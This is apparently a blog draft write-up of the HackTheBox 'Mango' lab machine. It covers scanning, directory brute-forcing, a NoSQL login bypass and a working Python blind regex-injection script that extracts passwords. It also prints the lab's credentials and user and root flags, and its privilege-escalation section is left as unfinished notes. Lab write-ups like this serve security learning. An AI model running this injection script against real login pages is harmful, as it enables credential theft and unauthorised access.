---
title: "HackTheBox - Mango"
date: 2020-02-28T13:11:24-08:00
draft: true
categories:
- HackTheBox
- write-ups
tags:
- security
keywords:
- pentesting
- Labs
- HackTheBox
- Mango
toc: true
autoThumbnailImage: false
coverImage: /images/HackTheBox/Mango/banner.JPG
---

Mango. Oh man. Getting user access on this box was intense. I personally have weak web exploitation skills when it comes to web attacks, so this box did teach me alot. In terms of realism, this box was definitely real-world related and I can apply everything I learned to any future pentests I will do. <!--more-->
<br>

|  Event | Challenge | OS | Difficulty | IP |
|:----------:|:------------:|:------------:|:------------:|:------------:|
| HackTheBox |  Mango  |  Linux  | Medium |  10.10.10.162  |

<!--toc-->

<hr>

## Tools Used

<hr>

* Burp Suite Community v2020.1
* Gobuster
* Nmap
* Seclists
* [NoSQL Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

<hr>

## Start

<hr>

Starting off, I did a quick nmap scan. Looking at the results, only 3 ports were open. I always launch a quick scan to give me ports to enumerate, since the full scan could take a long time to complete.
`nmap -oN quick-mango-10.10.10.162 10.10.10.162`

```
Nmap scan report for 10.10.10.162
Host is up (0.092s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

As soon as that's done, let's launch a full scan and at the same time, start enumerating the ports: `nmap -p- -T4 -A -oN mango-full-10.10.10.162 10.10.10.162`

First off, let's spin up Burp. It's a good idea to do all the web requests through burp as it can show you more info that coule be possibly useful later. Quickly looking at the website, port 80 gives us nothing. Well, something is blocking us from viewing the site on port 80. We will come back to this later.
![403-Forbidden](/images/HackTheBox/Mango/403.JPG)

Now let's try 443:
![Webpage](/images/HackTheBox/Mango/4.JPG)

And we got a cool google-esc looking website. The only thing available is the Analytics page near the top right.
![Webpage](/images/HackTheBox/Mango/5.JPG)

A quick detour to look back at our completed full scan shows us that there are no other open ports on the box. This means that the way in must be through one of the 3 ports we found.
```
Nmap scan report for 10.10.10.162
Host is up (0.088s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|_  256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/26%OT=22%CT=1%CU=44222%PV=Y%DS=2%DC=T%G=Y%TM=5E55FD4
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
OS:(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   90.82 ms 10.10.14.1
2   84.29 ms 10.10.10.162

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Alright, back to the website enumeration. The analytics page is interesting since it looks like a fancy graph.js plot. Clicking on everything shows us a _possible_ way in. Let's see if we can do an RFI with the Open Report function:

![Open Report](/images/HackTheBox/Mango/6.JPG)

AND..... We can't. Dang. Definitely not the way in. ![No RFI](/images/HackTheBox/Mango/7.JPG)

Let's keep going. I was actually stuck at this step for a while (*About 4-ish hours*) and eventually, I gave in and looked for a hint in the HTB forums. Someone mentioned something about hostnames so I keep enumerating. Finnaly looking at the cert information, we can see the box name is `staging-order.mango.htb`. ![Cert Info](/images/HackTheBox/Mango/8.JPG)

After setting this in our hosts file, we can now see the main page after navigating to it with the hostname.
![Hosts File](/images/HackTheBox/Mango/1.JPG)
![Port 80 - Now Visible](/images/HackTheBox/Mango/10.JPG)

Awesome! We have a login prompt. Ok. After all this trouble, this definitely has to be the way in. Trying default creds like `admin:admin` or `mango:mango` doesn't seem to do anything. Looking at the request through burp, everything seems normal and nothing sticks out to me. The good thing is now that we have another page to sift through, we can continue our enumeration. Let's throw Gobuster at this page.

<hr>

## Gobuster

<hr>

![Gobuster Results](/images/HackTheBox/Mango/11.JPG)

The wordlists I used are from [Dan Miessler's Seclists](https://github.com/danielmiessler/SecLists). After trying different wordlists, I found the `/vender/composer/` directory.

**Useful tips:** A cool flag to use while directory bruteforcing is `-x` This tells gobuster to look for files with the extension of your choosing while it does it's thing and scans the site. `gobuster -u http://staging-order.mango.htb/vendor/composer -w /opt/SecLists/Discovery/Web-Content/big.txt -x json | tee vendor-folder-2`. Another useful tip is to pipe your commands through `tee` which saves all the output directly to a file.

Looking at the `installed.json` file, something useful is revealed to us about the backend database to this site.:
![Installed.json file](/images/HackTheBox/Mango/12.JPG)

<hr>

## MongoDB

<hr>

Mongo DB!!! Ahhh. Our backend is running a NoSQL database. After researching NoSQL injections, I found this super useful [github repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection). It's literally the first entry that comes up when you google it.

The section about Authentication Bypass seemed super interesting. Let's try it in Mango.
![NoSQL Injection](/images/HackTheBox/Mango/14.JPG)

It seems we have 2 fields to manipulate. In order to be precise, let's just target the username field by itself then the password field after. We need to see which parameter is vulnerable, *if* they are actually vulnerable to NoSQL injections. In Burp, I'll intercept the request, and edit the username field by adding the `[$ne]` before sending it off.
![Burp request 1](/images/HackTheBox/Mango/15.JPG)

Doing that gives us no result. Let's try it again, but this time, we can modify the password field.

![Burp request 2](/images/HackTheBox/Mango/16.JPG)


Oh man!!! We have a 302 redirect to `home.php`. Looks like it did something.
![Burp request 3](/images/HackTheBox/Mango/16-1.JPG)

We are finally greeted with a under construction webpage.
![Burp request 4](/images/HackTheBox/Mango/17.JPG)

At this point, I am not 100% sure if the webpage is breaking because of our NoSQL Injection or there is actually no home page but we know two things now. One, our webpage is affected by a NoSQL injection. And two, we have to use this vulnerability to break our way in. Let's start by enumerating users. If you look at the under construction prompt, it seems we have one `admin`!

<hr>

## Enumerating Users

<hr>

In Burp, I sent the request over to the repeater. I know that if I get a `302 Redirect` then the username could possibly exist. Let's try the same request as before only this time, we can change the username to `bob`.
![Enumerating users](/images/HackTheBox/Mango/18.JPG)

And... that did nothing. Switching the username back to `mango` gives us the redirect once again. Trying it again with `admin` also gives a redirect. This confirms that we have 2 valid usernames as well as a way to enumerate users.

Valid users: `admin` & `mango`

<hr>

## NoSQL Injection

<hr>

Using the info from the *Extract data information* section, we can actually use the `$regex` syntax to do a blindly guess the password. The two fields that do give us a 302 redirect are: `username[$ne]=toto&password[$regex]=m.{2}` and `username[$ne]=toto&password[$regex]=m.*`. With this bit of information, we know we can slowly enumerate the password.

![NoSQL regex](/images/HackTheBox/Mango/19.JPG)

**Note: I did these next steps in Burp Intruder before getting stuck. I spent another good 3-4 hours breaking my head, trying to enumerate the users' passwords. Eventually I switched over to the route that everyone recommended in the forums, which was to create a script.**

The next logical step is to guess the password. Remember that we don't have any debugging information coming back to us, except a redirect. Therefore, this next attack will be done blindly, hence the name, **Blind NoSQL Injection**. We can start by using the script found under *POST with JSON body* on the same NoSQL Injection page.

```
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

Let's do some modifications to our script. First, let's add the json library, so we manipulate our payload in JSON. Speaking about JSON, since our mango app doesn't 'talk' in JSON, we need to change the header content-type back to a form. `headers={'Content-Type': 'application/x-www-form-urlencoded'}`. We also need to modify our payload to be in the same format as in our site along with the regex parameter, and remove a couple of "good" special chars.

Our ending result is this:
```
#!/usr/bin/python3
import json
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://staging-order.mango.htb"
headers={'Content-Type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload={"username": username, "password[$regex]": "^" + (password+c) }
            r = requests.post(u, data = payload, headers = headers, verify=False, allow_redirects = False)
            print(r, payload, end="\r", flush=True)
            if 'OK' in r.text or r.status_code == 302:
                print()
                print("Found one more char : %s" % (password+c))
                password += c
```
Running the script gives us the passwords! At this point we can keep getting $\'s, so we can stop the script and remove them.

```
Found one more char : h3mXK8RhU~f{]f5
Found one more char : h3mXK8RhU~f{]f5H
Found one more char : h3mXK8RhU~f{]f5H$
Found one more char : h3mXK8RhU~f{]f5H$$
Found one more char : h3mXK8RhU~f{]f5H$$$
Found one more char : h3mXK8RhU~f{]f5H$$$$
```
![The password.](/images/HackTheBox/Mango/20.JPG)

We have 2 passwords now: `admin:t9KcS3>!0B#2` and `mango:h3mXK8RhU~f{]f5H`.

When we log onto the site with the correct password, we immediately get the **under construction** page. We therefore know that the previous NoSQL injection attempts would actually log us into the website, but theres really nothing to log into.

## Logging onto the box.
With the creds we got, we can SSH onto the box with the mango account.
![SSH'ing in.](/images/HackTheBox/Mango/21.JPG)

<hr>

## User Flag

<hr>

 After looking around the box, we can home in on the user flag. We can `su admin`, and log into the admin account with the other cred we found.
![User flag](/images/HackTheBox/Mango/USER.JPG)

And there you have it. The user flag: `79bf31c6c6eb38a8567832f7f8b47e92`.
<hr>

## PrivEsc

<hr>

[LinEnum](https://github.com/rebootuser/LinEnum)

[GTFOBins](https://gtfobins.github.io/): [JJS & SUID](https://gtfobins.github.io/gtfobins/jjs/)

FILE READ-

##
 Root Flag
ROOT FLAG: ![Root flag](/images/HackTheBox/Mango/rootflag.JPG)
The root flag: `8a8ef79a7a2fbb01ea81688424e9ab15`.

FILE WRITE:
 ![SSH Config](/images/HackTheBox/Mango/permitrootSSH.JPG)

<hr>

## Root Shell

<hr>

![Fully rooted the box](/images/HackTheBox/Mango/ROOTED.JPG)
